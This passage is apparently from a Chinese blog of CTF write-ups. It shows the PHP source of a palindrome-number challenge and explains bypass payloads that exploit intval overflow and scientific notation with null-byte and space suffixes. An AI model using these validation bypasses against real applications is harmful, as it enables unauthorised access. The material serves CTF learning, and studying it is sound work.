header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;//这里判断的是未经trim()和addslashes()处理过的变量</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure></p>
<p>POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。<br>绕过方法：<br>1.<strong>利用intval函数溢出绕过</strong><br>$number不是数字；$number==strval(intval($number))；$number不是回文数</p>
<p>这里要看下操作系统，32位有符号数int范围-2147483648 ~ 2147483647；64位 - 9223372036854775808~9223372036854775807<br>可用payload<br>32位：2147483647%00；%002147483647；2147483647%20<br>64位：9223372036854775807%00；%009223372036854775807；9223372036854775807%20<br>%00可以放在数字前后，%20只能放在后面；这里的%00或者是%20可以将数字解释为字符串<br>2.<strong>用科学计数法构造0=0</strong><br>因为要求不能为回文数，但又要满足intval($req[“number”])=intval(strrev($req[“number”]))，所以我们采用科学计数法构造poc为number=0e-0%00，这样的话我们就可以绕过</p>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/06/01/实验吧小计/">实验吧ctf题小计</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 jas0nwhy 的个人博客">jas0nwhy</a></p>
        <p><span>发布时间:</span>2018年06月01日 - 11时35分</p>
        <p><span>最后更新:</span>2018年06月03日 - 21时45分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/06/01/实验吧小计/" title="实验吧ctf题小计">http://yoursite.com/child/2018/06/01/实验吧小计/</a>
            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/child/2018/06/01/实验吧小计/　　作者: jas0nwhy" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2018/06/12/C语言忘记点/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          C语言题库忘记点
        
      </div>
    </a>
  
  
    <a href="/2018/05/14/iscc ctf题小记(1)/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">iscc ctf题小记</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验吧ctf题小计"><span class="toc-number">1.</span> <span class="toc-text">实验吧ctf题小计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#天下武功唯快不破"><span class="toc-number">1.1.</span> <span class="toc-text">天下武功唯快不破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#what-a-fuck-这是什么鬼东西"><span class="toc-number">1.2.</span> <span class="toc-text">what a fuck!这是什么鬼东西?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#拐弯抹角"><span class="toc-number">1.3.</span> <span class="toc-text">拐弯抹角</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单的登录题"><span class="toc-number">1.4.</span> <span class="toc-text">简单的登录题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CBC字节翻转攻击"><span class="toc-number">1.4.1.</span> <span class="toc-text">CBC字节翻转攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#后台登录"><span class="toc-number">1.5.</span> <span class="toc-text">后台登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#上传绕过"><span class="toc-number">1.6.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Once-More"><span class="toc-number">1.7.</span> <span class="toc-text">Once More</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#程序逻辑问题"><span class="toc-number">1.8.</span> <span class="toc-text">程序逻辑问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php大法"><span class="toc-number">1.9.</span> <span class="toc-text">php大法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Forms"><span class="toc-number">1.10.</span> <span class="toc-text">Forms</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单的SQL注入2"><span class="toc-number">1.11.</span> <span class="toc-text">简单的SQL注入2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单的SQL注入3"><span class="toc-number">1.12.</span> <span class="toc-text">简单的SQL注入3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单的SQL注入"><span class="toc-number">1.13.</span> <span class="toc-text">简单的SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#你真的会PHP吗？"><span class="toc-number">1.14.</span> <span class="toc-text">你真的会PHP吗？</span></a></li></ol></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
        <section class="youyan" id="comments">
  <div id="uyan_frame"></div>
  <script src="http://v2.uyan.cc/code/uyan.js?uid=2152382"></script>
</section>

    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/06/12/C语言忘记点/" title="上一篇: C语言题库忘记点">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2018/05/14/iscc ctf题小记(1)/" title="下一篇: iscc ctf题小记">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/06/22/CBC字节翻转攻击/">CBC字节翻转攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/12/Metasploit 整理笔记(更新中)/">Metasploit 整理笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/12/C语言忘记点/">C语言题库忘记点</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/实验吧小计/">实验吧ctf题小计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/14/iscc ctf题小记(1)/">iscc ctf题小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/14/变量覆盖漏洞/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/09/代码审计类ctf记录/">代码审计类ctf记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/25/python-爬虫学习/">python爬虫学习1</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/python基础学习/">python基础学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/python：requests模块介绍/">python：requests模块介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/文件解析漏洞学习/">文件解析漏洞学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/GOOGLE  HAKING/">Google hacking利用简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/正则表达式学习笔记/">正则表达式学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/SQL注入基本步骤/">SQL注入基本步骤</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/24/web任务来了!!!!!!/">web任务来了！！！</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/24/关于我/">关于我</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2018 jas0nwhy
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
</body>
</html>